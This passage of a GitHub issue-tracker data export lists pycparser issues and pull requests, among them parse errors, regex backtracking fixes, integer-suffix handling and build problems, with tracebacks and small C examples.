  File ""/home/zingale/.local/lib/python2.7/site-packages/pycparser/ply/yacc.py"", line 193, in call_errorfunc
    r = errorfunc(token)
  File ""/home/zingale/.local/lib/python2.7/site-packages/pycparser/c_parser.py"", line 1848, in p_error
    column=self.clex.find_tok_column(p)))
  File ""/home/zingale/.local/lib/python2.7/site-packages/pycparser/plyparser.py"", line 67, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: tmp_build_dir/t/3d.gnu.MPI.EXE/Castro_error_F-cppd.h:3:6: before: int8_t```

is it possible to add this to the list of data types?
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/352/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/352/comments,https://api.github.com/repos/eliben/pycparser/issues/352/events,https://github.com/eliben/pycparser/issues/352,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/351,497536413,MDU6SXNzdWU0OTc1MzY0MTM=,351,Issue when running example codes,53484324,closed,FALSE,NA,NA,2,2019-09-24T08:26:49Z,2020-03-03T14:38:07Z,2020-03-03T14:38:07Z,NONE,NA,"Error when trying this command :
**python examples/c-to-c.py /home/aishu/Desktop/coll_rew_ast.txt**
![ast-c-error](https://user-images.githubusercontent.com/53484324/65525506-3b103e80-df0d-11e9-9bc7-3022625f8459.png)

",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/351/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/351/comments,https://api.github.com/repos/eliben/pycparser/issues/351/events,https://github.com/eliben/pycparser/issues/351,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/350,497220217,MDExOlB1bGxSZXF1ZXN0MzIwMzkzNTE5,350,Recognize integer multicharacter constants like 'ABCD',29219583,closed,FALSE,NA,NA,3,2019-09-23T17:07:36Z,2019-09-25T12:44:55Z,2019-09-25T12:44:55Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/350/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/350/comments,https://api.github.com/repos/eliben/pycparser/issues/350/events,https://github.com/eliben/pycparser/pull/350,https://api.github.com/repos/eliben/pycparser/pulls/350
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/349,496219713,MDU6SXNzdWU0OTYyMTk3MTM=,349,DeprecationWarnings emitted from re.compile,823911,closed,FALSE,NA,NA,2,2019-09-20T08:31:21Z,2020-08-18T15:22:03Z,2020-08-18T15:22:03Z,NONE,NA,"Running `python3.6 -mpytest tests` raises a DeprecationWarning
```
tests/test_c_lexer.py:166
  /tmp/pycparser/tests/test_c_lexer.py:166: DeprecationWarning: invalid escape sequence \9
    '""jx\9""',

tests/test_c_lexer.py:169
  /tmp/pycparser/tests/test_c_lexer.py:169: DeprecationWarning: invalid escape sequence \9
    '""fo\9999999""',

-- Docs: https://docs.pytest.org/en/latest/warnings.html
```

It seems all the `re.compile` expressions should be using `r` raw strings?

xref numpy/numpy#14554",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/349/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/349/comments,https://api.github.com/repos/eliben/pycparser/issues/349/events,https://github.com/eliben/pycparser/issues/349,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/348,488376223,MDU6SXNzdWU0ODgzNzYyMjM=,348,Parsing C to obtain syscall locations,11542566,closed,FALSE,NA,NA,0,2019-09-03T03:36:40Z,2019-09-03T18:06:50Z,2019-09-03T18:06:50Z,NONE,NA,"Hello all,

(apologies if I'm overlooking something!)

I'm wondering if pycparser supports locating syscalls like it does function calls? 

Thank you!
-Stefan

",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/348/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/348/comments,https://api.github.com/repos/eliben/pycparser/issues/348/events,https://github.com/eliben/pycparser/issues/348,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/347,483694924,MDExOlB1bGxSZXF1ZXN0MzA5NzIzMTky,347,Fix slow backtracking when parsing strings (no external deps),1904430,closed,FALSE,NA,NA,6,2019-08-21T23:20:00Z,2019-08-26T21:18:40Z,2019-08-26T21:18:39Z,CONTRIBUTOR,NA,"Fixes #61

This uses negative lookaheads to avoid ambiguity in how string should be
parsed by the regex.
- https://docs.python.org/2/library/re.html#regular-expression-syntax

- Previously, if it didn't immediately succeed at parsing an escape
  sequence such as `\123`, it would have to try `\1`+`23`, `\12` + `3`,
  and `\123`, which multiplied the time taken by 3 per additional escape
  sequence. This solves that by only allowing `\123`
- The same fix was added for hex escapes.

Also fix a test that relied on the incorrect handling of regexes.
The implementation documentation says that it intends to allow
**decimal** escapes permissively.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/347/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/347/comments,https://api.github.com/repos/eliben/pycparser/issues/347/events,https://github.com/eliben/pycparser/pull/347,https://api.github.com/repos/eliben/pycparser/pulls/347
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/346,483138446,MDExOlB1bGxSZXF1ZXN0MzA5Mjc2MDk5,346,Fix error transforming an empty switch,1904430,closed,FALSE,NA,NA,1,2019-08-21T00:12:44Z,2019-08-21T17:15:23Z,2019-08-21T17:15:23Z,CONTRIBUTOR,NA,"The parser would throw on that line for `switch(1) {}`
because NoneType is not iterable.

Fixes #345",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/346/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/346/comments,https://api.github.com/repos/eliben/pycparser/issues/346/events,https://github.com/eliben/pycparser/pull/346,https://api.github.com/repos/eliben/pycparser/pulls/346
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/345,482061896,MDU6SXNzdWU0ODIwNjE4OTY=,345,"""'NoneType' object is not iterable"" seen for switch statement without cases",1904430,closed,FALSE,NA,NA,1,2019-08-19T01:04:36Z,2019-08-21T17:15:23Z,2019-08-21T17:15:23Z,CONTRIBUTOR,NA,"Seen calling parse_file on a file containing the below snippet (similar code was generated by a preprocessor). This compiles with `gcc`. I think checking if block_items is None may be sufficient.

```c
int main() {
    int type = 2;
    switch(type) {}
}
```

```
/usr/local/lib/python3.7/site-packages/pycparser/ply/yacc.py in parseopt_notrack(self, input, lexer, debug, tracking, tokenfunc)
   1116                             del symstack[-plen:]
   1117                             self.state = state
-> 1118                             p.callable(pslice)
   1119                             del statestack[-plen:]
   1120                             symstack.append(sym)

/usr/local/lib/python3.7/site-packages/pycparser/c_parser.py in p_selection_statement_3(self, p)
   1505         """""" selection_statement : SWITCH LPAREN expression RPAREN pragmacomp_or_statement """"""
   1506         p[0] = fix_switch_cases(
-> 1507                 c_ast.Switch(p[3], p[5], self._token_coord(p, 1)))
   1508 
   1509     def p_iteration_statement_1(self, p):

/usr/local/lib/python3.7/site-packages/pycparser/ast_transforms.py in fix_switch_cases(switch_node)
     75     # Goes over the children of the Compound below the Switch, adding them
     76     # either directly below new_compound or below the last Case as appropriate
---> 77     for child in switch_node.stmt.block_items:
     78         if isinstance(child, (c_ast.Case, c_ast.Default)):
     79             # If it's a Case/Default:

TypeError: 'NoneType' object is not iterable
```",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/345/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/345/comments,https://api.github.com/repos/eliben/pycparser/issues/345/events,https://github.com/eliben/pycparser/issues/345,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/344,482058311,MDExOlB1bGxSZXF1ZXN0MzA4NDA4OTQ0,344,Fix slow backtracking when checking for invalid strings,1904430,closed,FALSE,NA,NA,0,2019-08-19T00:35:59Z,2019-08-21T13:12:17Z,2019-08-21T13:12:17Z,CONTRIBUTOR,NA,"Use `regex` instead of `re`, and use atomic grouping.
To avoid surprises, use it everywhere.

https://pypi.org/project/regex/

> This regex implementation is backwards-compatible with the standard
> ‘re’ module, but offers additional functionality.

Fixes #61

This uses atomic grouping, which avoids the unnecessary backtracking.

> `(?>...)`
>
> If the following pattern subsequently fails, then the subpattern as a
whole will fail.

Also fix a test that relied on the incorrect handling of regexes.
The implementation documentation says that pycparser intends to allow
**decimal** escapes permissively.",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/344/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/344/comments,https://api.github.com/repos/eliben/pycparser/issues/344/events,https://github.com/eliben/pycparser/pull/344,https://api.github.com/repos/eliben/pycparser/pulls/344
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/343,480608320,MDExOlB1bGxSZXF1ZXN0MzA3MjcwOTY1,343,Add more intrinsics,974662,closed,FALSE,NA,NA,0,2019-08-14T10:43:48Z,2019-08-27T06:51:18Z,2019-08-20T18:51:42Z,CONTRIBUTOR,NA,NA,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/343/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/343/comments,https://api.github.com/repos/eliben/pycparser/issues/343/events,https://github.com/eliben/pycparser/pull/343,https://api.github.com/repos/eliben/pycparser/pulls/343
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/342,476765011,MDU6SXNzdWU0NzY3NjUwMTE=,342,variable scope,4627943,closed,FALSE,NA,NA,1,2019-08-05T09:52:31Z,2019-08-06T12:17:29Z,2019-08-06T12:17:29Z,NONE,NA,"Hello,

How can I get if a variable is Local, Global or extern? and ideally where(which file/line) its declared?

Thank you.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/342/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/342/comments,https://api.github.com/repos/eliben/pycparser/issues/342/events,https://github.com/eliben/pycparser/issues/342,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/341,476502150,MDU6SXNzdWU0NzY1MDIxNTA=,341,handling #define in c code,4627943,closed,FALSE,NA,NA,2,2019-08-04T00:37:18Z,2019-08-04T21:30:18Z,2019-08-04T21:30:18Z,NONE,NA,"Hi, 

Im trying to do some traces between function calls etc.. but some macros, definitions with #define are not supported with pycparser! :(

I wonder what would you suggest to cover those?

Thank you",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/341/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/341/comments,https://api.github.com/repos/eliben/pycparser/issues/341/events,https://github.com/eliben/pycparser/issues/341,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/340,476491964,MDU6SXNzdWU0NzY0OTE5NjQ=,340,getting variable declaration point,10137,closed,FALSE,NA,NA,0,2019-08-03T21:43:04Z,2019-08-15T01:44:33Z,2019-08-15T01:44:33Z,NONE,NA,"Hello,

I trying to find where a variable is declared, for example first checking the local declarations and if its not there look for it in global declarations, but i dont see how i can do that!
I cannot see how to differentiate between local, global and extern variables from another file?

Any advice can help me.

Thank you",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/340/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/340/comments,https://api.github.com/repos/eliben/pycparser/issues/340/events,https://github.com/eliben/pycparser/issues/340,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/339,473462418,MDExOlB1bGxSZXF1ZXN0MzAxNjI1MDU5,339,Headers for Vectors,7755313,closed,FALSE,NA,NA,0,2019-07-26T17:32:34Z,2019-07-30T03:10:13Z,2019-07-30T03:10:13Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/339/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/339/comments,https://api.github.com/repos/eliben/pycparser/issues/339/events,https://github.com/eliben/pycparser/pull/339,https://api.github.com/repos/eliben/pycparser/pulls/339
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/338,472765409,MDU6SXNzdWU0NzI3NjU0MDk=,338,pycparser to plant UML:  Insted of general AST I want to use plant UML in sepcific are there any sugusstions or any extension for interpeters can be a great help ,30198723,closed,FALSE,NA,NA,1,2019-07-25T09:38:44Z,2019-07-25T21:23:51Z,2019-07-25T21:23:51Z,NONE,NA,,NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/338/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/338/comments,https://api.github.com/repos/eliben/pycparser/issues/338/events,https://github.com/eliben/pycparser/issues/338,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/337,472416176,MDExOlB1bGxSZXF1ZXN0MzAwODMwNDI5,337,Header for Vectorization,7755313,closed,FALSE,NA,NA,0,2019-07-24T17:52:46Z,2019-07-26T17:26:45Z,2019-07-26T17:26:44Z,CONTRIBUTOR,NA,Issue #333 ,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/337/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/337/comments,https://api.github.com/repos/eliben/pycparser/issues/337/events,https://github.com/eliben/pycparser/pull/337,https://api.github.com/repos/eliben/pycparser/pulls/337
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/336,470033909,MDU6SXNzdWU0NzAwMzM5MDk=,336,C parser doesn't work with function attribute to place function in special sections,16970019,closed,FALSE,NA,NA,2,2019-07-18T23:06:01Z,2019-07-19T02:50:35Z,2019-07-19T02:50:34Z,NONE,NA,"If I add to `__attribute__ ((section (""bar"")))` to my function prototype and then run `c-to-c.py`, the program breaks and is unable to print out anything.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/336/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/336/comments,https://api.github.com/repos/eliben/pycparser/issues/336/events,https://github.com/eliben/pycparser/issues/336,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/335,467465828,MDU6SXNzdWU0Njc0NjU4Mjg=,335,Problem with function pointer,30198723,closed,FALSE,NA,NA,3,2019-07-12T15:10:39Z,2019-07-16T07:18:07Z,2019-07-16T07:18:07Z,NONE,NA,"static sm_trans transition_table[NUM_STATES][NUM_EVENTS] = {

        [NA] =
        {
                [CFG_DONE] =
                {
                        .cng = DOWN,
                        .action = drop_down
                }
        },

        [L2UP] =
        {
                [READY] =
                {
                        .action = subscribe
                },
                [RESERVED] =
                {
                        .action = remove_endpoints
                },
                [DOWN] =
                {
                        .cng = DOWN
                },
                [IP_READY] =
                {
                        .cng = UP
                },
        },
};

static sm_trans *transition_lp(int state, int trigger)
{ /////errror before this brace
        return &transition_table[state][trigger];
}

**********************************************error********************************************
pycparser.plyparser.ParseError: home/sm.c:170:1: before: {
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/335/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/335/comments,https://api.github.com/repos/eliben/pycparser/issues/335/events,https://github.com/eliben/pycparser/issues/335,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/334,466954886,MDU6SXNzdWU0NjY5NTQ4ODY=,334,Getting Define errors in STD Libraries,30198723,closed,FALSE,NA,NA,2,2019-07-11T15:14:45Z,2019-07-15T13:41:57Z,2019-07-15T13:41:57Z,NONE,NA,"There are lot of Define errors poping up is there a simpler way to solve this than Writing Define for each of the error like (-D'__nptr=' -D'__endptr=')

pycparser.plyparser.ParseError: /repo/ebolsur/int-g2/build/devfs/bpu/rcs-distro/arm/usr/include/stdlib.h:165:27: before: __endptr
 /repo/ebolsur/int-g2/build/devfs/bpu/rcs-distro/arm/usr/include/stdlib.h:164:46: before: __nptr
 /repo/ebolsur/int-g2/build/devfs/bpu/rcs-distro/arm/usr/include/stdlib.h:71:19: before: __attribute__
pycparser.plyparser.ParseError: /repo/ebolsur/int-g2/build/devfs/bpu/rcs-distro/arm/usr/include/sys/select.h:106:51: before: __readfds


",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/334/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/334/comments,https://api.github.com/repos/eliben/pycparser/issues/334/events,https://github.com/eliben/pycparser/issues/334,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/333,465965303,MDU6SXNzdWU0NjU5NjUzMDM=,333,header for vectorization m128,7755313,closed,FALSE,NA,NA,4,2019-07-09T20:15:29Z,2019-08-26T22:09:32Z,2019-08-26T22:09:32Z,CONTRIBUTOR,NA,"Hi,
It;s probably my understanding that is wrong but I am trying to add facke header for vectorization. And the pre-processing is still failing.

Can you please add a fake header for supporting __m128i",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/333/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/333/comments,https://api.github.com/repos/eliben/pycparser/issues/333/events,https://github.com/eliben/pycparser/issues/333,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/332,463961521,MDU6SXNzdWU0NjM5NjE1MjE=,332,parsing for namespace ?,3013418,closed,FALSE,NA,NA,1,2019-07-03T21:29:23Z,2019-07-06T12:28:10Z,2019-07-06T12:28:10Z,NONE,NA,"```
$ autopxd -I /usr/include -I /opt/cloudera/parcels/Anaconda3/include -I /usr/lib/gcc/x86_64-redhat-linux/4.8.2/include -I /usr/include/c++/4.8.2/x86_64-redhat-linux -I /usr/include/c++/4.8.2  VCEUtilities.h VCEUtilities.pxd

Traceback (most recent call last):

. . . .
    r = errorfunc(token)
  File ""/opt/cloudera/parcels/Anaconda3/lib/python3.6/site-packages/pycparser/c_parser.py"", line 1761, in p_error
    column=self.clex.find_tok_column(p)))
  File ""/opt/cloudera/parcels/Anaconda3/lib/python3.6/site-packages/pycparser/plyparser.py"", line 66, in _parse_error
    raise ParseError(""%s: %s"" % (coord, msg))
pycparser.plyparser.ParseError: /usr/include/c++/4.8.2/bits/memoryfwd.h:50:11: before: std

```

/usr/include/c++/4.8.2/bits/memoryfwd.h
line 50
before std has a keyword `namespace`.

I wonder if pycparser requires .hpp extension for the header files to be processed as C++ and not as C.

",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/332/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/332/comments,https://api.github.com/repos/eliben/pycparser/issues/332/events,https://github.com/eliben/pycparser/issues/332,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/331,462927307,MDU6SXNzdWU0NjI5MjczMDc=,331,Supporting comments in C code generation,721169,closed,FALSE,NA,NA,1,2019-07-01T21:51:35Z,2019-08-26T22:09:47Z,2019-08-26T22:09:47Z,NONE,NA,"Note that this is about adding comments to the AST after parsing, not parsing comments.

For context, I'm consuming another file format and then emitting C code based on it. I'd like to include explanatory comments which describe why the code was produced that way to aid in later debugging.

I currently have two hacky ways of dealing with this: in some cases I simply wait until I'm ready to emit code and then shove the comment in the right place once it's a string, and in other cases I fake it by inserting an ID whose value starts with ""//"". Obviously, neither of these is ideal; in the one case I'm forced to carry a large amount of information through my already-more-complicated-than-it-should-be code, and in the other I can't emit inline comments + comments all end with semicolons. If there are better ways inside the existing codebase that would be great to know.

Normally, I would just write up a patch adding support for them in the grammar + cgenerator and see if you wanted to pull it, but I can see how that would be confusing to the many people who seem to want to parse comments. And I do, after all, have a workaround that is 'good enough' for me for now. So, two questions:

1/ is this something you would be interested in?
2/ can you think of an approach less likely to generate confusion?

Thanks!",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/331/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/331/comments,https://api.github.com/repos/eliben/pycparser/issues/331/events,https://github.com/eliben/pycparser/issues/331,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/330,460860392,MDU6SXNzdWU0NjA4NjAzOTI=,330,Changing C syntax,18707623,closed,FALSE,NA,NA,3,2019-06-26T09:27:58Z,2019-08-26T22:10:00Z,2019-08-26T22:10:00Z,NONE,NA,"I would like to experimentally simplified C coding syntax,
by re-using python syntax rules.

This is original C code :

```
int check(int k, int* nailed, int* A, int* B, int N, int* C, int M)
{

    int i;
    for (i = 0; i < k; i++){
        int j;
        for (j = 0; j < N; j++){
            if (A[j] <= C[i] && C[i] <= B[j]){
                nailed[j] = 1; 
            }
        }
    }
  
    for (i = 0; i < N; i++){   
        if (nailed[i] == 0){
            return 0;
        }
    }
  
    return 1;
}

```

Instead I would like to write this code and parse it 
and compile into C compiled code :
```
int check(int k, int* nailed, int* A, int* B, int N, int* C, int M) :
    int i
    for (i = 0; i < k; i++) :
        int j
        for (j = 0; j < N; j++) :
            if (A[j] <= C[i] && C[i] <= B[j]) :
                nailed[j] = 1
  
    for (i = 0; i < N; i++) : 
        if (nailed[i] == 0) :
            return 0
  
    return 1
```


Is there a way to change pycparser to parse such code of code ?
",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/330/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/330/comments,https://api.github.com/repos/eliben/pycparser/issues/330/events,https://github.com/eliben/pycparser/issues/330,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/329,453625700,MDExOlB1bGxSZXF1ZXN0Mjg2Mjc4ODQz,329,Fix issue #99: parser for FuncDecl incorrectly sets declname attribute on return type,2787443,closed,FALSE,NA,NA,0,2019-06-07T17:48:37Z,2019-06-27T12:44:21Z,2019-06-27T12:44:20Z,CONTRIBUTOR,NA,visit_Cast was emitting declname (default behavior) for to_type attribute incorrectly.,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/329/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/329/comments,https://api.github.com/repos/eliben/pycparser/issues/329/events,https://github.com/eliben/pycparser/pull/329,https://api.github.com/repos/eliben/pycparser/pulls/329
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/328,451684268,MDExOlB1bGxSZXF1ZXN0Mjg0NzI2NDQ1,328,Fix issue #187: Ability to provide preexisting typedefs to the parser,2787443,closed,FALSE,NA,NA,1,2019-06-03T20:52:31Z,2019-06-04T12:22:02Z,2019-06-04T12:22:02Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/328/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/328/comments,https://api.github.com/repos/eliben/pycparser/issues/328/events,https://github.com/eliben/pycparser/pull/328,https://api.github.com/repos/eliben/pycparser/pulls/328
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/327,450919326,MDExOlB1bGxSZXF1ZXN0Mjg0MTQzMzIx,327,Fix issue #314: Failed parsing unnamed function parameters with array dim qualifiers,2787443,closed,FALSE,NA,NA,1,2019-05-31T18:08:28Z,2019-06-01T12:06:53Z,2019-06-01T12:06:49Z,CONTRIBUTOR,NA,"* Add unnamed function parameter tests
* Fix grammar rule",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/327/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/327/comments,https://api.github.com/repos/eliben/pycparser/issues/327/events,https://github.com/eliben/pycparser/pull/327,https://api.github.com/repos/eliben/pycparser/pulls/327
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/326,439591893,MDExOlB1bGxSZXF1ZXN0Mjc1MzYzNzk2,326,Fix issue #324: u/l constant integer suffix,1267701,closed,FALSE,NA,NA,0,2019-05-02T13:29:36Z,2019-05-09T14:00:26Z,2019-05-09T14:00:25Z,CONTRIBUTOR,NA,"The PR fixes the issue #324.
I've followed the changes made in PR #277 ",NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/326/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/326/comments,https://api.github.com/repos/eliben/pycparser/issues/326/events,https://github.com/eliben/pycparser/pull/326,https://api.github.com/repos/eliben/pycparser/pulls/326
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/325,439580759,MDExOlB1bGxSZXF1ZXN0Mjc1MzU0OTg0,325,PR for issue #324 long unsigned suffix,1267701,closed,FALSE,NA,NA,0,2019-05-02T13:05:51Z,2019-05-02T13:26:24Z,2019-05-02T13:13:19Z,CONTRIBUTOR,NA,,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/325/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/325/comments,https://api.github.com/repos/eliben/pycparser/issues/325/events,https://github.com/eliben/pycparser/pull/325,https://api.github.com/repos/eliben/pycparser/pulls/325
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/324,439573164,MDU6SXNzdWU0Mzk1NzMxNjQ=,324,Incorrect Parsing of unsigned int and long int,1267701,closed,FALSE,NA,NA,0,2019-05-02T12:49:01Z,2019-05-09T14:00:42Z,2019-05-09T14:00:42Z,CONTRIBUTOR,NA,"Similar to issue #253, integer constants with `u/U` and `l/L` suffix are not correctly parsed.

```c
int i = 1uLL;
```
is parsed as 
```
Decl: i, [], [], []
  TypeDecl: i, []
    IdentifierType: ['int']
  Constant: int, 1
```
While it should be 
```
Decl: i, [], [], []
  TypeDecl: i, []
    IdentifierType: ['int']
  Constant: unsigned long long int, 1
```

https://gcc.gnu.org/onlinedocs/gcc/Long-Long.html",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/324/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/324/comments,https://api.github.com/repos/eliben/pycparser/issues/324/events,https://github.com/eliben/pycparser/issues/324,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/323,434270969,MDExOlB1bGxSZXF1ZXN0MjcxMjk3NzQ0,323,A simple example rewrite Assignment to Augmented Assignment by Visitor,32974708,closed,FALSE,NA,NA,1,2019-04-17T13:02:58Z,2019-04-19T13:12:04Z,2019-04-19T13:12:04Z,NONE,NA,Another example of rewriting AST node by Visitor.,NA,TRUE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/323/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/323/comments,https://api.github.com/repos/eliben/pycparser/issues/323/events,https://github.com/eliben/pycparser/pull/323,https://api.github.com/repos/eliben/pycparser/pulls/323
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/322,433849707,MDU6SXNzdWU0MzM4NDk3MDc=,322,Python 3 type annotations,371089,open,FALSE,NA,NA,1,2019-04-16T15:37:11Z,2019-10-18T23:28:39Z,NA,CONTRIBUTOR,NA,"I won't have time to send a PR for this, and it's not clear that it's worth the maintenance burden even if I did... but I wanted to make a note in the issue tracker for searchability's sake that I wrote some type annotation files for use with mypy: https://gist.github.com/simonlindholm/a08dabc8afe58af985015183ef425fa1

I've found them mainly useful for reference -- it's hard to guess from _c_ast.cfg what types the different properties have, and testing manually on toy examples takes time and is prone to errors (e.g., it's easy to miss ExprList behaving differently for offsetof). But it's also rather satisfying to be able to use mypy on a program that uses pycparser and know it won't fail at runtime.

Unfortunately it doesn't seem viable to create these type annotations automatically or verify that they are correct, but _c_ast.cfg could perhaps be extended to include them.",NA,FALSE,https://api.github.com/repos/eliben/pycparser,https://api.github.com/repos/eliben/pycparser/issues/322/labels{/name},https://api.github.com/repos/eliben/pycparser/issues/322/comments,https://api.github.com/repos/eliben/pycparser/issues/322/events,https://github.com/eliben/pycparser/issues/322,NA
eliben,pycparser,https://api.github.com/repos/eliben/pycparser/issues/321,432623519,MDExOlB1bGxSZXF1ZXN0MjcwMDU3NDgz,321,Fix build of lexing/parsing tables in restricted python environments,553893,closed,FALSE,NA,NA,0,2019-04-12T15:29:51Z,2019-04-13T13:16:55Z,2019-04-13T13:16:55Z,CONTRIBUTOR,NA,"Restricted environments like embeddable python do not include the current working directory on startup, thus the call to `_build_tables.py` fails when invoking `setup.py`:

    D:\Repositories\pycparser.git>python-3.6.8-embed-amd64\python.exe setup.py sdist
    [...]
    making hard links in pycparser-2.19...
    Build the lexing/parsing tables
    Traceback (most recent call last):
      File ""_build_tables.py"", line 14, in <module>
        from _ast_gen import ASTCodeGenerator
    ModuleNotFoundError: No module named '_ast_gen'
    Traceback (most recent call last):
      File ""setup.py"", line 65, in <module>
        cmdclass={'install': install, 'sdist': sdist},
      File ""distutils\core.py"", line 148, in setup
      File ""distutils\dist.py"", line 955, in run_commands
      File ""distutils\dist.py"", line 974, in run_command
      File ""distutils\command\sdist.py"", line 155, in run
      File ""distutils\command\sdist.py"", line 435, in make_distribution
      File ""setup.py"", line 32, in make_release_tree
        msg=""Build the lexing/parsing tables"")
      File ""distutils\cmd.py"", line 335, in execute
      File ""distutils\util.py"", line 301, in execute
      File ""setup.py"", line 18, in _run_build_tables
        cwd=os.path.join(dir, 'pycparser'))
      File ""subprocess.py"", line 311, in check_call
    subprocess.CalledProcessError: Command '['D:\\Repositories\\pycparser.git\\python-3.6.8-embed-amd64\\python.exe', '-B', '_build_tables.py']' returned non-zero exit status 1.

